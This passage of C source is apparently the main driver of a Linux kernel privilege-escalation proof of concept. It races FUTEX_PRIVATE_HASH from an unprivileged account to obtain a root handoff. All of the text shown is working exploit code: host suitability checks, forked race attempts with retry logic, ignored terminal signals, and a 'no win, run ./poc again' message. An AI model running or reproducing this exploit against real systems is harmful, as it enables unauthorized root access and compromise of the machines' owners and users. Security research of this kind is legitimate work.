		while (waitpid(-1, NULL, WNOHANG) > 0)
			;
		if (!killed)
			return;
		(void)usleep(20000);
	}
}

static void abort_attempt(int unsafe, const char *why)
{
	if (getpid() == attempt_root_pid) {
		if (unsafe)
			(void)dprintf(STDERR_FILENO, "[-] stopped: %s\n", why);
		else
			kill_attempt_descendants();
		_exit(unsafe ? ATTEMPT_EXIT_UNSAFE : ATTEMPT_EXIT_RETRY);
	}
	payload_handoff_park();
}

static void finish_attempt(void)
{
	struct pollfd ready = { .fd = result_read_fd, .events = POLLIN };
	pid_t effect = (pid_t)atomic_load_explicit(&effect_shared->effect_pid,
						   memory_order_acquire);
	char token = 0;
	int status = 0;
	int result;

	do {
		result = poll(&ready, 1, ROOT_WAIT_TIMEOUT_MS);
	} while (result < 0 && errno == EINTR);
	if (result != 1 || (ready.revents & POLLIN) == 0 ||
	    read(result_read_fd, &token, 1) != 1 || token != 'R' ||
	    effect <= 1) {
		(void)dprintf(STDERR_FILENO,
			      "[-] no root handoff (effect_error=%d)\n",
			      atomic_load_explicit(&effect_shared->effect_error,
						   memory_order_acquire));
		abort_attempt(ATTEMPT_UNSAFE, "no root handoff");
	}
	while (waitpid(effect, &status, 0) < 0 && errno == EINTR)
		;
	kill_attempt_descendants();
	_exit(0);
}

static void PAYLOAD_HANDOFF_NORETURN run_attempt(void)
{
	pid_t aio_pid = -1;

	attempt_root_pid = getpid();

	if (payload_handoff_nnp_is(0) != 0 ||
	    pin_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0 ||
	    futex_race_singleton_cpu(FUTEX_RACE_CONTROLLER_CPU) != 0)
		_exit(ATTEMPT_EXIT_UNSAFE);
	effect_shared = mmap(NULL, sizeof(*effect_shared),
			     PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,
			     -1, 0);
	if (effect_shared == MAP_FAILED ||
	    payload_handoff_prepare_effect(effect_shared, &result_read_fd) != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);
	if (pipe_bank_prepare_target() != 0 || start_pipe_bank() != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);

	payload_handoff_close_fixed_all();
	if (prefork_aio_reservoir(&aio_pid) != 0 || aio_pid <= 1 ||
	    commit_parent_no_new_privs() != 0)
		abort_attempt(ATTEMPT_RETRY, NULL);
	run_futex_race();
}

static int host_supported(void)
{
	uid_t ruid;
	uid_t euid;
	uid_t suid;
	long cpus = sysconf(_SC_NPROCESSORS_ONLN);
	struct payload_handoff_ids ids;
	int probe;
	int usable = 0;

	if (getresuid(&ruid, &euid, &suid) != 0 || ruid == 0 || euid == 0 ||
	    suid == 0 || ruid != euid || euid != suid) {
		(void)dprintf(STDERR_FILENO,
			      "[-] run me as a normal unprivileged user\n");
		return -1;
	}
	if (cpus < 4) {
		(void)dprintf(STDERR_FILENO,
			      "[-] need at least 4 online CPUs, found %ld\n",
			      cpus);
		return -1;
	}
	if (sysconf(_SC_PAGESIZE) != (long)FUTEX_RACE_WORD_PAGE_SIZE) {
		(void)dprintf(STDERR_FILENO, "[-] need a 4 KiB page size\n");
		return -1;
	}
	if (payload_handoff_capture_ids(&ids) != 0)
		return -1;
	payload_handoff_start_uid = ids.ruid;
	payload_handoff_start_gid = ids.rgid;
	if (!payload_handoff_ids_are_start(&ids)) {
		(void)dprintf(
			STDERR_FILENO,
			"[-] run me with a plain id set (no setuid/setgid wrapper)\n");
		return -1;
	}
	probe = open(payload_handoff_target_dir,
		     O_PATH | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC);
	if (probe >= 0) {
		int target = openat(probe, payload_handoff_target_path,
				    O_RDONLY | O_NOFOLLOW | O_CLOEXEC);

		if (target >= 0) {
			struct payload_handoff_fd_identity identity;

			usable = payload_handoff_target_preflight(
					 target, &identity) == 0;
			(void)close(target);
		}
		(void)close(probe);
	}
	if (!usable) {
		(void)dprintf(STDERR_FILENO,
			      "[-] %s/%s is not a usable target on this host\n",
			      payload_handoff_target_dir,
			      payload_handoff_target_path);
		return -1;
	}
	return 0;
}

static long read_percpu_kb(void)
{
	char buffer[4096];
	const char *cursor;
	int fd = open("/proc/meminfo", O_RDONLY | O_CLOEXEC);
	ssize_t got;

	if (fd < 0)
		return -1;
	got = read(fd, buffer, sizeof(buffer) - 1);
	(void)close(fd);
	if (got <= 0)
		return -1;
	buffer[got] = '\0';
	cursor = strstr(buffer, "\nPercpu:");
	if (!cursor)
		return -1;
	return strtol(cursor + sizeof("\nPercpu:") - 1, NULL, 10);
}

int main(void)
{
	unsigned int attempt;
	uint64_t started;
	long percpu_start = read_percpu_kb();

	if (payload_handoff_root_stage_selected())
		payload_handoff_root_stage();
	if (host_supported() != 0)
		return 1;

	(void)signal(SIGINT, SIG_IGN);
	(void)signal(SIGQUIT, SIG_IGN);
	(void)signal(SIGHUP, SIG_IGN);
	(void)signal(SIGTSTP, SIG_IGN);
	(void)dprintf(
		STDOUT_FILENO,
		"[*] FUTEX_PRIVATE_HASH first-reference race, target %s/%s\n"
		"[*] terminal signals are ignored while racing; kill -9 -%ld (the\n"
		"[*] whole process group) from elsewhere to stop\n",
		payload_handoff_target_dir, payload_handoff_target_path,
		(long)getpgrp());
	started = monotonic_ns_generic();
	for (attempt = 1; attempt <= MAX_EXPLOIT_ATTEMPTS; ++attempt) {
		if (monotonic_ns_generic() - started > CAMPAIGN_BUDGET_NS)
			break;
		pid_t child = fork();
		pid_t done;
		int status = 0;

		if (child < 0) {
			(void)dprintf(STDERR_FILENO,
				      "[-] cannot fork an attempt (errno %d)\n",
				      errno);
			return 1;
		}
		if (child == 0)
			run_attempt();
		while ((done = waitpid(child, &status, 0)) < 0 &&
		       errno == EINTR)
			;
		if (done != child) {
			(void)dprintf(STDERR_FILENO,
				      "[-] lost attempt %u (errno %d)\n",
				      attempt, errno);
			return 1;
		}
		if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
			return 0;
		if (!WIFEXITED(status) ||
		    WEXITSTATUS(status) != ATTEMPT_EXIT_RETRY) {
			(void)dprintf(
				STDERR_FILENO,
				"[-] attempt %u stopped in an ambiguous state; not retrying\n",
				attempt);
			return 1;
		}
		if (attempt % 50U == 0U)
			(void)dprintf(STDOUT_FILENO, "[*] %u attempts\n",
				      attempt);

		(void)usleep(50000);
	}
	(void)dprintf(STDERR_FILENO,
		      "[-] no win after %u attempts / %us; run ./poc again\n",
		      attempt - 1U, (unsigned int)CAMPAIGN_BUDGET_SECONDS);
	if (percpu_start > 0)
		(void)dprintf(
			STDERR_FILENO,
			"[-] percpu grew %ld -> %ld kB; the race needs alloc_percpu to\n"
			"[-] still populate pages, so a freshly booted host is the best try\n",
			percpu_start, read_percpu_kb());
	return 1;
}
